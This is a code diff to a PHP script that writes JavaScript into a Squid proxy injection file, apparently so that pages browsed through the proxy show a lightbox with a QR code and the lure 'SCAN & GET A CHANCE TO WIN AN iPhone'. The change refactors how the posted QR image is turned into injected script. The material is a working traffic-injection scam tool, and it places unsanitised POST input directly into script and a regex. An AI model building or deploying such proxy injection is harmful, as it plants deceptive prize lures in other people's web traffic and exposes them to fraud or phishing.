@@ -2,8 +2,7 @@
 $domain = 'http://127.0.0.1';
 const PASARELA = '/etc/squid/pasarela.js';
 
-if(file_exists('qr.data')){
-$src = trim(file_get_contents('qr.data'));
+function inject_qr($src){
 $pasarela = <<<MARKER
 //IGNORE
 if(!document.getElementById('#qrl')){
@@ -26,6 +25,7 @@ function lightbox_close(){
 document.body.insertAdjacentHTML('beforeend', '<div id="light"><strong>SCAN & GET A CHANCE TO WIN AN iPhone</strong><br/> \
   <img src="data:image/png;base64,$src" /></div><div id="fade" onclick="lightbox_close();"></div>');
 MARKER;
+return $pasarela;
 }
 
 function update_pasarela($content, $mode){
@@ -37,8 +37,7 @@ function update_pasarela($content, $mode){
 
 <?php
   if($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['c'])){
-    $fp = fopen('qr.data', 'w');
-    fwrite($fp, $_POST['c']);
+    $src = $_POST['c'];
     if(file_exists(PASARELA)){
         $qr = trim(file_get_contents(PASARELA));
         $pattern = '/src=\"data:image\/png;base64,(.+?)\"/';
@@ -47,7 +46,7 @@ function update_pasarela($content, $mode){
           $qr = preg_replace("/$matches[1]/", $src, $qr);
         }
         else{
-          $qr = $pasarela;
+          $qr = inject_qr($src);
         }
         update_pasarela($qr, 'a');
     }
